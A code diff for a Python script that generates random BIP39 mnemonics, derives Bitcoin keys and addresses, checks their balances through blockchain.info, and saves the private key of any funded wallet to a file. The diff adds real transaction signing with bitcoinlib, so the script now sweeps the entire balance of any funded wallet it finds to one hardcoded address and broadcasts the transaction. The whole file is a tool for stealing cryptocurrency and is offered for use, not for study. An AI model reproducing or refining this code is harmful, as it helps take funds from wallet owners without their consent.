@@ -1,125 +1,189 @@
+import hashlib
+import base58
+import ecdsa
+import requests
+from bitcoinlib.wallets import Wallet, wallet_delete
+from bitcoinlib.keys import HDKey
+from rich.console import Console
+from rich.table import Table
+from mnemonic import Mnemonic
 import os
 import time
-import requests
-from mnemonic import Mnemonic
-from bip32utils import BIP32Key
-from hashlib import sha256, new as hashlib_new
-import ecdsa
-import base58
+import socket
 
-# Set to keep track of checked addresses
-checked_addresses = set()
+# Function to convert private key to WIF
+def private_key_to_wif(private_key, compressed=True):
+    prefix = b'\x80' + private_key
+    if compressed:
+        prefix += b'\x01'
+    checksum = hashlib.sha256(hashlib.sha256(prefix).digest()).digest()[:4]
+    return base58.b58encode(prefix + checksum).decode()
 
-def generate_mnemonic(word_count=24):
-    mnemo = Mnemonic("english")
-    mnemonic = mnemo.generate(strength=word_count * 32 // 3)
-    return mnemonic
-
-def mnemonic_to_seed(mnemonic):
-    mnemo = Mnemonic("english")
-    seed = mnemo.to_seed(mnemonic)
-    return seed
-
-def derive_private_keys(seed):
-    bip32_root_key_obj = BIP32Key.fromEntropy(seed)
-    bip32_child_key_obj = bip32_root_key_obj.ChildKey(0).ChildKey(0).ChildKey(0).ChildKey(0).ChildKey(0)
-    return bip32_child_key_obj.WalletImportFormat(), bip32_child_key_obj.PrivateKey()
-
-def private_key_to_wif(private_key_hex):
-    private_key_bytes = bytes.fromhex(private_key_hex)
-    extended_key = b'\x80' + private_key_bytes
-    first_sha256 = sha256(extended_key).digest()
-    second_sha256 = sha256(first_sha256).digest()
-    checksum = second_sha256[:4]
-    wif = extended_key + checksum
-    return base58.b58encode(wif).decode()
-
-def private_key_to_public_key(private_key, compressed=True):
+# Function to derive the Bitcoin address
+def private_key_to_address(private_key, compressed=True):
     sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
     vk = sk.verifying_key
     if compressed:
-        return (b'\x02' + vk.to_string()[:32]) if vk.to_string()[-1] % 2 == 0 else (b'\x03' + vk.to_string()[:32])
+        public_key = b'\x02' + vk.to_string()[:32] if vk.to_string()[-1] % 2 == 0 else b'\x03' + vk.to_string()[:32]
     else:
-        return b'\x04' + vk.to_string()
-
-def public_key_to_address(public_key):
-    sha256_pk = sha256(public_key).digest()
-    ripemd160 = hashlib_new('ripemd160')
-    ripemd160.update(sha256_pk)
+        public_key = b'\x04' + vk.to_string()
+    ripemd160 = hashlib.new('ripemd160')
+    ripemd160.update(hashlib.sha256(public_key).digest())
     hashed_public_key = ripemd160.digest()
-    extended_ripemd160 = b'\x00' + hashed_public_key
-    checksum = sha256(sha256(extended_ripemd160).digest()).digest()[:4]
-    binary_address = extended_ripemd160 + checksum
-    address = base58.b58encode(binary_address).decode()
-    return address
+    address_prefix = b'\x00' + hashed_public_key
+    checksum = hashlib.sha256(hashlib.sha256(address_prefix).digest()).digest()[:4]
+    return base58.b58encode(address_prefix + checksum).decode()
 
-def check_balance(address):
-    response = requests.get(f'https://blockchain.info/q/addressbalance/{address}')
+# Function to fetch UTXOs
+def fetch_utxos(address):
+    url = f"https://blockchain.info/unspent?active={address}"
+    response = requests.get(url)
     if response.status_code == 200:
-        return int(response.text)
+        data = response.json()
+        return data.get('unspent_outputs', [])
     else:
-        return 0
+        return []
 
-def create_transaction(private_key_wif, source_address, dest_address, balance):
-    tx_fee = 10000  # satoshis (0.0001 BTC)
-    net_balance = balance - tx_fee
-    if net_balance <= 0:
-        return None
+# Function to calculate total balance
+def calculate_total_balance(utxos):
+    return sum(utxo['value'] for utxo in utxos)
 
-    # Construct raw transaction (simplified example, needs actual implementation)
-    raw_tx = f"Raw transaction data from {source_address} to {dest_address} with {net_balance} satoshis"
-    return raw_tx
+# Function to create and sign the transaction
+def create_signed_transaction(utxos, from_address, to_address, private_key_wif):
+    if not utxos:
+        raise Exception("No UTXOs found")
 
-def broadcast_transaction(raw_tx):
-    response = requests.post("https://blockchain.info/pushtx", data={'tx': raw_tx})
-    return response.status_code == 200
+    w = Wallet.create('sweep_wallet', keys=private_key_wif, network='bitcoin', witness_type='legacy')
+    w.utxos_update()
+    utxos = w.utxos()
+    if not utxos:
+        raise Exception("No UTXOs found in wallet")
 
-def save_to_file(data, filename):
-    with open(filename, 'a') as f:
-        f.write(data + '\n')
+    balance_btc = calculate_total_balance(utxos) / 1e8
+    tx = w.transaction_create([(to_address, balance_btc, 'btc')], fee=10000)
+    tx_signed = w.transaction_sign(tx)
+    return tx_signed
 
-def main():
-    word_counts = [12, 18, 24]  # Different lengths of mnemonic phrases
-    while True:
+# Function to check network connectivity
+def check_network():
+    try:
+        socket.create_connection(("1.1.1.1", 53))
+        return True
+    except OSError:
+        return False
+
+# Function to save WIF to file
+def save_wif_to_file(wif, balance):
+    with open('wif_with_balance.txt', 'a') as file:
+        file.write(f"{wif}, Balance: {balance:.8f} BTC\n")
+
+# Address to sweep to
+to_address = "3KgiK7FdnEHpBDt3uie9mU1QRnVN8sP81o"
+
+# Generate mnemonics
+mnemo = Mnemonic("english")
+mnemonic_lengths = [12, 18, 24]
+
+def generate_mnemonic(length):
+    entropy = os.urandom(length * 4 // 3)
+    return mnemo.to_mnemonic(entropy)
+
+while True:
+    if not check_network():
+        print("Network connection lost. Retrying in 60 seconds...")
+        time.sleep(60)
+        continue
+
+    mnemonics = [generate_mnemonic(length) for length in mnemonic_lengths for _ in range(5)]
+
+    # Initialize console and table
+    console = Console()
+    table = Table(show_header=True, header_style="bold magenta")
+    table.add_column("Type", style="dim", width=12)
+    table.add_column("WIF", width=52)
+    table.add_column("Address", width=42)
+    table.add_column("Balance (BTC)", justify="right")
+
+    # Process each mnemonic
+    for mnemonic in mnemonics:
+        # Derive the seed from the mnemonic
+        seed = mnemo.to_seed(mnemonic)
+        hd_key = HDKey.from_seed(seed)
+
+        # Get the private key in raw bytes
+        private_key = hd_key.private_byte
+
+        # Generate WIF keys
+        wif_compressed = private_key_to_wif(private_key, compressed=True)
+        wif_uncompressed = private_key_to_wif(private_key, compressed=False)
+        
+        # Derive addresses
+        address_compressed = private_key_to_address(private_key, compressed=True)
+        address_uncompressed = private_key_to_address(private_key, compressed=False)
+
+        # Fetch UTXOs and calculate balances
         try:
-            for word_count in word_counts:
-                mnemonic = generate_mnemonic(word_count)
-                seed = mnemonic_to_seed(mnemonic)
-                wif, private_key = derive_private_keys(seed)
-                
-                uncompressed_public_key = private_key_to_public_key(private_key, compressed=False)
-                compressed_public_key = private_key_to_public_key(private_key, compressed=True)
-                
-                uncompressed_address = public_key_to_address(uncompressed_public_key)
-                compressed_address = public_key_to_address(compressed_public_key)
-                
-                if uncompressed_address in checked_addresses and compressed_address in checked_addresses:
-                    continue
+            utxos_compressed = fetch_utxos(address_compressed)
+            balance_satoshis_compressed = calculate_total_balance(utxos_compressed)
+            balance_btc_compressed = balance_satoshis_compressed / 1e8
 
-                uncompressed_balance = check_balance(uncompressed_address)
-                compressed_balance = check_balance(compressed_address)
-
-                checked_addresses.add(uncompressed_address)
-                checked_addresses.add(compressed_address)
-                
-                if uncompressed_balance > 1000000:
-                    raw_tx = create_transaction(wif, uncompressed_address, "3KgiK7FdnEHpBDt3uie9mU1QRnVN8sP81o", uncompressed_balance)
-                    if raw_tx and broadcast_transaction(raw_tx):
-                        save_to_file(mnemonic, 'hunted.txt')
-
-                if compressed_balance > 1000000:
-                    raw_tx = create_transaction(wif, compressed_address, "3KgiK7FdnEHpBDt3uie9mU1QRnVN8sP81o", compressed_balance)
-                    if raw_tx and broadcast_transaction(raw_tx):
-                        save_to_file(mnemonic, 'hunted.txt')
-                
-                print(f'Mnemonic ({word_count} words): {mnemonic}')
-                print(f'Uncompressed Address: {uncompressed_address}, Balance: {uncompressed_balance}')
-                print(f'Compressed Address: {compressed_address}, Balance: {compressed_balance}')
-        
+            utxos_uncompressed = fetch_utxos(address_uncompressed)
+            balance_satoshis_uncompressed = calculate_total_balance(utxos_uncompressed)
+            balance_btc_uncompressed = balance_satoshis_uncompressed / 1e8
         except Exception as e:
-            print(f'Error: {e}')
-        
-        time.sleep(1)  # Sleep for a second before next iteration
+            print(f"Error fetching UTXOs: {e}")
+            continue
 
-if __name__ == '__main__':
-    main()
+        # Add data to table
+        table.add_row("Compressed", wif_compressed, address_compressed, f"{balance_btc_compressed:.8f}")
+        table.add_row("Uncompressed", wif_uncompressed, address_uncompressed, f"{balance_btc_uncompressed:.8f}")
+
+        # Save WIF if balance is above 0.001 BTC
+        if balance_btc_compressed > 0.001:
+            save_wif_to_file(wif_compressed, balance_btc_compressed)
+
+        if balance_btc_uncompressed > 0.001:
+            save_wif_to_file(wif_uncompressed, balance_btc_uncompressed)
+
+        # Sweep funds if balance is available
+        transaction_created = False
+        
+        if balance_btc_compressed > 0:
+            try:
+                tx_signed_compressed = create_signed_transaction(utxos_compressed, address_compressed, to_address, wif_compressed)
+                tx_hex_compressed = tx_signed_compressed.as_hex()
+
+                def broadcast_transaction(tx_hex):
+                    url = "https://blockchain.info/pushtx"
+                    response = requests.post(url, data={'tx': tx_hex})
+                    return response.text
+
+                broadcast_result_compressed = broadcast_transaction(tx_hex_compressed)
+                transaction_created = True
+            except Exception as e:
+                print(f"Error creating or broadcasting transaction: {e}")
+        
+        if balance_btc_uncompressed > 0:
+            try:
+                tx_signed_uncompressed = create_signed_transaction(utxos_uncompressed, address_uncompressed, to_address, wif_uncompressed)
+                tx_hex_uncompressed = tx_signed_uncompressed.as_hex()
+
+                broadcast_result_uncompressed = broadcast_transaction(tx_hex_uncompressed)
+                transaction_created = True
+            except Exception as e:
+                print(f"Error creating or broadcasting transaction: {e}")
+        
+        # Clean up the created wallet if a transaction was created
+        if transaction_created:
+            wallet_delete('sweep_wallet')
+        
+        # Refresh the table display
+        console.clear()
+        console.print(table)
+
+    # Print the final table
+    console.clear()
+    console.print(table)
+    
+    # Pause for a short period before repeating the loop
+    time.sleep(30)
